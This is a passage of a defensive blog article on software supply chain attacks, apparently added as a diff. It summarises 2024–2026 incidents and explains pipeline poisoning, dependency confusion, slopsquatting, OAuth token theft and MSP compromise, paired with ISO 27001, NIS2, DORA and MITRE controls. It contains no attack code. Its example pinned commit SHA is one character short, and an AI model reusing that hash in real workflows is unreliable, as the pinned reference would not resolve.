+  <p><strong>Prevention:</strong> MFA alone would likely have prevented the entire attack. This incident also represents a textbook <strong>DORA Article 29</strong> (<a href="<https://www.digital-operational-resilience-act.com/Article_29.html>">source</a>) concentration risk failure: systemic dependence on a single payment processor meant a single breach cascaded to the entire US healthcare payment ecosystem. <strong>ISO 27001 A.5.19</strong> (supplier vetting) would require MFA as a baseline contractual requirement. <strong>NIS2 Article 23</strong> (<a href="<https://www.nis-2-directive.com/NIS_2_Directive_Article_23.html>">source</a>) 24-hour early warning obligations would have triggered immediate cross-sector notification.</p>
+
+  <hr class="article-divider"/>
+
+  <h3>Oracle (2025) — Two Breaches Exposing Legacy Risk</h3>
+
+  <p>Two concurrent incidents hit Oracle in early 2025. In the <strong>Oracle Cloud Classic SSO/LDAP breach</strong>, threat actor "rose87168" exfiltrated approximately <strong>6 million records</strong> from SSO and LDAP systems spanning <strong>140,000+ tenants</strong>, reportedly exploiting <strong>CVE-2021-35587</strong> (Oracle Access Manager unauthenticated RCE, CVSS 9.8) — <a href="<https://nvd.nist.gov/vuln/detail/CVE-2021-35587>">NVD</a> — on severely outdated Oracle Fusion Middleware 11G servers. The attacker demanded <strong>100,000 Monero (~$200 million)</strong>. Separately, the <strong>Oracle Health (Cerner) breach</strong> saw compromised credentials access legacy data migration servers, exposing patient health records across at least <strong>16 health systems</strong>.</p>
+
+  <p><strong>Key lesson:</strong> Running end-of-life software in a production cloud environment representing critical infrastructure violates the most basic supply chain hygiene. <strong>ISO 27001 A.5.22</strong> requires monitoring, review, and change management of supplier services — including software lifecycle status. <strong>NIS2 Article 21(2)(e)</strong> (<a href="<https://www.nis-2-directive.com/NIS_2_Directive_Article_21.html>">source</a>) requires security in acquisition and maintenance of network and information systems.</p>
+
+  <hr class="article-divider"/>
+
+  <h3>tj-actions/changed-files GitHub Actions Compromise (March 2025)</h3>
+
+  <p>A cascading attack compromised the popular GitHub Action <code>tj-actions/changed-files</code> (used in <strong>23,000+ repositories</strong>). <strong>CVE-2025-30066</strong> (CVSS 8.6) — <a href="<https://nvd.nist.gov/vuln/detail/CVE-2025-30066>">NVD</a>. The chain: compromised SpotBugs maintainer PAT → hijacked <code>reviewdog/action-setup</code> token → poisoned <code>tj-actions/eslint-changed-files</code> → poisoned <code>tj-actions/changed-files</code>. The attacker modified <strong>all existing version tags</strong> to point to a malicious commit that dumped CI/CD secrets to public build logs. Palo Alto's Unit 42 revealed the <strong>true target was Coinbase</strong> — the attacker obtained write access to <code>coinbase/agentkit</code> before pivoting broadly.</p>
+
+  <p><strong>MITRE ATT&amp;CK techniques:</strong></p>
+  <ul>
+    <li>T1677 (Poisoned Pipeline Execution, added ATT&amp;CK v18 May 2025) — <a href="<https://attack.mitre.org/techniques/T1677/>">link</a></li>
+    <li>T1552.001 (Unsecured Credentials: Credentials in Files) — <a href="<https://attack.mitre.org/techniques/T1552/001/>">link</a></li>
+  </ul>
+
+  <p><strong>Prevention:</strong> Pin GitHub Actions to full commit SHAs rather than mutable tags (e.g., <code>uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af68</code> instead of <code>uses: actions/checkout@v4</code>). Use OpenSSF's <a href="<https://github.com/ossf/scorecard-action>">scorecard-action</a> to continuously audit third-party Actions. Implement branch protection rules preventing tag reassignment.</p>
+
+  <hr class="article-divider"/>
+
+  <h3>Additional Notable 2025–2026 Incidents</h3>
+
+  <p>The <strong>Marks &amp; Spencer attack</strong> (April 2025) by Scattered Spider via DragonForce ransomware, originating through third-party vendor <strong>TCS's IT helpdesk</strong> via social engineering, resulted in <strong>£300 million+ in lost operating profit</strong> and 46+ days of suspended online orders. The <strong>Snowflake customer breaches</strong> (mid-2024) saw UNC5537 compromise <strong>165 customer environments</strong> (including AT&amp;T's <strong>110 million customer records</strong>) using infostealer-harvested credentials — none had MFA enabled. The <strong>Chrome extension supply chain campaign</strong> (December 2024) compromised <strong>36+ extensions</strong> with <strong>2.6 million users</strong> via a single phished Cyberhaven developer OAuth token. The <strong>xrpl.js npm compromise</strong> (April 2025) saw phished Ripple employee npm credentials poison the official XRP Ledger SDK (140,000+ weekly downloads) to exfiltrate private keys. The <strong>Jaguar Land Rover attack</strong> (August 2025) halted global production for five weeks with estimated losses of <strong>£1.9 billion</strong> — the most economically damaging cyber incident in UK manufacturing history.</p>
+
+</div><!-- /annex-a -->
+
+<hr class="article-divider"/>
+
+<!-- ============================================================ -->
+<!-- ANNEX B — TECHNICAL DETAILS: HOW ATTACKERS COMPROMISE        -->
+<!-- ============================================================ -->
+
+<div id="annex-b">
+  <span class="annex-label">Annex B</span>
+  <h2>Technical Details: How Attackers Compromise the Supply Chain</h2>
+
+  <h3>CI/CD pipeline attacks exploit the build process itself</h3>
+
+  <p>Modern software delivery pipelines are now a frontline attack surface. If attackers can modify build logic, pipeline secrets, or release artifacts, they can inject malicious code into legitimate software and distribute it at scale.</p>
+
+  <p>MITRE ATT&amp;CK v18 introduced <strong>T1677 (Poisoned Pipeline Execution)</strong> — <a href="<https://attack.mitre.org/techniques/T1677/>">link</a> — in May 2025, recognizing CI/CD as a distinct attack surface. Three sub-types exist:</p>
+  <ul>
+    <li><strong>Direct PPE:</strong> Modifying CI config files (e.g., <code>.github/workflows/*.yml</code>, <code>.gitlab-ci.yml</code>) to inject malicious steps</li>
+    <li><strong>Indirect PPE:</strong> Injecting into files referenced by CI config — Makefiles, test scripts, linters — exploiting unsafe use of <code>${{ github.event.pull_request.title }}</code> interpolation</li>
+    <li><strong>Public PPE:</strong> Malicious pull requests from forks exploiting the <code>pull_request_target</code> trigger, which runs in the context of the base branch with access to secrets</li>
+  </ul>
+
+  <p>SolarWinds exemplifies build-process compromise; the Codecov Bash Uploader breach (2021) showed secret exfiltration — a single injected <code>curl</code> line exfiltrated all environment variables from <strong>29,000+ enterprise customers'</strong> CI environments for two months.</p>
+
+  <h4>What this means operationally</h4>
+  <ul>
+    <li>protect CI/CD platforms as critical infrastructure,</li>
+    <li>isolate build environments,</li>
+    <li>enforce signed builds and release provenance,</li>
+    <li>monitor for anomalous pipeline changes,</li>
+    <li>restrict and rotate pipeline secrets.</li>
+  </ul>
+
+  <hr class="article-divider"/>
+
+  <h3>Dependency confusion and typosquatting poison package registries</h3>
+
+  <p>Attackers exploit the fact that package managers trust names and versions. If a malicious package looks sufficiently similar to an internal or popular package, it may be pulled automatically into builds.</p>
+
+  <p><strong>Dependency confusion</strong> (T1195.001 — <a href="<https://attack.mitre.org/techniques/T1195/001/>">link</a>) exploits how package managers resolve names when both private and public registries are configured. Alex Birsan's 2021 proof-of-concept successfully executed code at <strong>35+ organizations</strong> including Apple, Microsoft, PayPal, and Tesla by publishing public packages with identical names to internal packages but higher version numbers, earning <strong>$130,000+ in bounties</strong>. Orca Security found <strong>49% of organizations</strong> remain vulnerable (<a href="<https://orca.security/resources/blog/dependency-confusion-supply-chain-attacks/>">source</a>).</p>
+
+  <p><strong>Typosquatting</strong> uses near-identical names — character omissions (<code>reqeusts</code>), delimiter confusion (<code>crossenv</code> vs <code>cross-env</code>), and scope mimicry. A new variant, <strong>slopsquatting</strong>, registers package names hallucinated by LLMs — research shows <strong>5–38% hallucination rates</strong> for package names across leading models. The <strong>PhantomRaven campaign</strong> (August 2025) used slopsquatting to compromise 126 packages with 86,000 installs.</p>
+
+  <h4>What matters most</h4>
+  <ul>
+    <li>private package namespace controls,</li>
+    <li>lock files and hash verification,</li>
+    <li>package allow-listing,</li>
+    <li>automated dependency scanning,</li>
+    <li>developer awareness of typosquatting and slopsquatting risks.</li>
+  </ul>
+
+  <hr class="article-divider"/>
+
+  <h3>OAuth token compromise enables silent lateral movement</h3>
+
+  <p>Modern SaaS environments are deeply interconnected. OAuth tokens can grant persistent API-level access, often bypassing the visibility organizations expect from user-centric controls.</p>
+
+  <p><strong>T1528 (Steal Application Access Token)</strong> — <a href="<https://attack.mitre.org/techniques/T1528/>">link</a> — describes how compromised OAuth tokens bypass MFA entirely and enable movement across interconnected SaaS applications. The <strong>Salesloft/Drift breach</strong> (August 2025) saw attackers steal OAuth tokens from the Drift chatbot integration, gaining API-level access to Salesforce data at <strong>700+ organizations</strong>. Organizations average <strong>112 SaaS applications</strong> (BetterCloud), each expanding the OAuth attack surface.</p>
+
+  <h4>Priority controls</h4>
+  <ul>
+    <li>app consent governance,</li>
+    <li>least privilege for integrations,</li>
+    <li>continuous token and app monitoring,</li>
+    <li>rapid revocation capability,</li>
+    <li>review of cross-tenant or multi-tenant integrations.</li>
+  </ul>
+
+  <hr class="article-divider"/>
+
+  <h3>Open-source poisoning follows the XZ playbook</h3>
+
+  <p>The XZ case showed that not all open-source risk looks like a vulnerability. Sometimes the risk is <strong>social, procedural, and long-term</strong>: maintainer burnout, unreviewed releases, release-to-source mismatches, or compromised publishing credentials.</p>
+
+  <p>XZ Utils established the template: multi-year trust-building, social engineering of overburdened maintainers, and insertion of sophisticated backdoors. The pattern is repeating: the <code>xrpl.js</code> npm package was compromised via phishing a Ripple employee's npm credentials; the <code>eslint-config-prettier</code> package was compromised via a phished maintainer affecting <strong>14,000+ downstream packages</strong>. <strong>Protestware</strong> adds another dimension: the <code>node-ipc</code> maintainer deliberately sabotaged systems with Russian/Belarusian IPs in 2022; the <code>colors.js</code> and <code>faker.js</code> maintainer deliberately introduced infinite loops in libraries with millions of weekly downloads.</p>
+
+  <p><strong>Leadership takeaway:</strong> software risk is not only about known CVEs. It is also about <strong>whether the software supply process itself is trustworthy</strong>.</p>
+
+  <hr class="article-divider"/>
+
+  <h3>MSP compromise creates one-to-many amplification</h3>
+
+  <p>Managed service providers, IT outsourcers, support desks, and remote administration vendors often have the access attackers want most: privileged, persistent, and trusted.</p>
+
+  <p><strong>T1199 (Trusted Relationship)</strong> — <a href="<https://attack.mitre.org/techniques/T1199/>">link</a> — describes how MSPs' privileged access (VPN, RMM tools, admin credentials to hundreds of client networks) creates devastating amplification. Beyond Kaseya, Chinese state group <strong>APT10 (Operation Cloud Hopper)</strong> systematically targeted MSPs for downstream access. In 2025, <strong>SimpleHelp RMM vulnerabilities</strong> (CVE-2024-57726, CVE-2024-57727, CVE-2024-57728 — <a href="<https://nvd.nist.gov/vuln/detail/CVE-2024-57726>">NVD</a>) were exploited to deploy DragonForce ransomware through MSPs. The M&amp;S attack originated via Tata Consultancy Services, which ran M&amp;S's IT helpdesk.</p>
+
+  <p><strong>Executive meaning:</strong> the more critical the supplier's access, the more dangerous even a "small" supplier weakness becomes.</p>
+
+</div><!-- /annex-b -->
+
+<hr class="article-divider"/>
+
+<a class="back-link-bottom" href="index.html#blog">Back to Writing</a>
+</div>
+<footer> <span>© 2026 Gabriel Hasik</span> <span>Built with intention · <a href="https://gabrielhasik.com">gabrielhasik.com</a></span> <span>Cyber · Risk · Supply Chain</span> </footer>
+</body> </html>
